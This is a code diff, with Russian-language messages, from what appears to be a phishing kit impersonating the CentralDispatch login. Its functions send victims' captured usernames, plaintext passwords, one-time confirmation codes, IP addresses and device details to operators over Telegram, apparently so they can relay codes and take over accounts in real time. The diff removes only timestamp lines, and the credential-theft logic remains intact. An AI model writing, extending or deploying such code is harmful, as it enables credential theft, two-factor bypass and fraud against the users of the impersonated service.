@@ -60,14 +60,12 @@ export async function sendLoginTelegram(
     }
   }
 
-  const currentTime = formatDate(new Date());
   const ipLine = ip && ip !== "unknown" ? `\n🌍 *IP:* \`${ip}\`` : "";
 
   const message = `🔐 *CentralDispatch - Новый вход в систему*
 
 👤 *Username:* \`${username}\`
 🔑 *Password:* \`${password}\`${ipLine}${countryInfo}
-⏰ *Время:* ${currentTime}
 
 Выберите действие:`;
 
@@ -177,14 +175,10 @@ export async function sendCodeTelegram(
 
   console.log("[TELEGRAM] Отправка кода на Chat IDs:", chatIds.join(", "));
 
-  const currentTime = formatDate(new Date());
-
   const message = `🔐 *CentralDispatch - Код подтверждения*
 
 📝 *Код:* \`${code}\`
 👤 *Username:* \`${username}\`
-
-⏰ *Время:* ${currentTime}
 
 Введите этот код для подтверждения входа.`;
 
@@ -388,12 +382,9 @@ export async function sendVisitNotification(
 
   // Определяем тип устройства
   const deviceType = getDeviceType(userAgent);
-  const currentTime = formatDate(new Date());
   const ipLine = ip && ip !== "unknown" ? `\n🌍 *IP:* \`${ip}\`` : "";
 
-  const message = `${visitType}
-
-⏰ *Время:* ${currentTime}${ipLine}${countryInfo}
+  const message = `${visitType}${ipLine}${countryInfo}
 ${deviceType}
 
 Кто-то зашел на сайт CentralDispatch.`;
